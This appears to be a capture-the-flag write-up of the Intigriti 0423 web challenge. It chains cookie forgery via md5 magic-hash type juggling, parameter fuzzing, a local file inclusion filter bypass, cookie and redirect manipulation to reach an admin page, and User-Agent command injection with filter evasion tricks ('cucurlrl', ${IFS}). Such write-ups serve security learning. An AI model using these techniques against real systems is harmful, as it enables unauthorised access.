0423: We Like to Sell Bricks:https://challenge-0423.intigriti.io/challenge.php

+ When we logged in with the given credentials, we can see two cookies are set. username and account_type. While trying to send the account_type value as a array, we get the following error:
```
<b>Fatal error</b>:  Uncaught TypeError: md5(): Argument #1 ($string) must be of type string, array given in /app/dashboard.php:68
Stack trace:
#0 /app/dashboard.php(68): md5(Array)
#1 {main}
  thrown in <b>/app/dashboard.php</b> on line <b>68</b><br />
 
 ```
 + Awesome, it seems that the value of the account_type cookie is being hashed with md5 and compared to something.
+ For example:
md5('240610708') -> "0e462097431906509019562988736854"
md5('QNKCDZO') -> "0e830400451993494058024219903391" , so
md5('240610708') == md5('QNKCDZO') is TRUE


Let's try changing the account_type value to "240610708"

```curl 'https://challenge-0423.intigriti.io/dashboard.php'  \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0'' \
-H 'Cookie: account_type=240610708; username=strange'
 ```
Success! The assumption is correct and we have additional HTML content in the response:

```
<h3 id="custom_image.php - try to catch the flag.txt ;)">A special golden wall just for Premium Users ;) </h3><img src="resources/happyrating.png">$ FREE4U
Yet another hint from the challenge creator, let's visit "custom_image.php"
```

+ If the player fuzzes the parameters for the custom_image.php endpoint, they'll find https://challenge-0423.intigriti.io/custom_image.php?file= produces a Permission denied! error.
`wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://challenge-0423.intigriti.io/custom_image.php?FUZZ= --hh 294753`
The endpoint is vulnerable to LFI but ../../ are filtered and a simple regex will block www/web/images
+ The player needs to bypass this, e.g. with https://challenge-0423.intigriti.io/custom_image.php?file=www/web/images/......\flag.txt

This will load a corrupted image, by copying the base64 of the image from the html and decrypting it you can get the content of this file:
```
<img
    src="data: image/jpeg;base64,SGV5IE1hcmlvLCB0aGUgZmxhZyBpcyBpbiBhbm90aGVyIHBhdGghIFRyeSB0byBjaGVjayBoZXJlOgoKL2U3ZjcxN2VkLWQ0MjktNGQwMC04NjFkLTQxMzdkMWVmMjlhYi85NzA5ZTk5My1iZTQzLTQxNTctODc5Yi03OGI2NDdmMTVmZjcvYWRtaW4ucGhwCg=="
/>
```
Decoded:
Hey Mario, the flag is in another path! Try to check here:

/e7f717ed-d429-4d00-861d-4137d1ef29ab/9709e993-be43-4157-879b-78b647f15ff7/admin.php
+ Now the player has a new endpoint to visit: https://challenge-0423.intigriti.io/e7f717ed-d429-4d00-861d-4137d1ef29ab/9709e993-be43-4157-879b-78b647f15ff7/admin.php

Whenever you visit this endpoint, as you are not an admin, you will be redirected to the login page.

Since the redirect is done incorrectly, loading the page content in the response and adding a simple location header, we have two possible ways to display the page.

- Response manipulation; just change the 302 to 200 and remove the location header with burp (match and replace), or simply intercepting the response and editing it manually.

- Edit the username cookie and set it from strange to admin, since the checking for the admin page is performed only on that cookie (weak).

+ Each time the admin page is loaded, the site logs the User-Agent (as hinted in the logs endpoint). Since the user agent is saved by executing a terminal command, that header is vulnerable to command injection.
+ There are some security checks, such as removing some characters, spaces, and some functions but locked functions can be easily bypassed, e.g. cucurlrl will become curl
+ As for the spaces, one way to bypass them is to use ${IFS}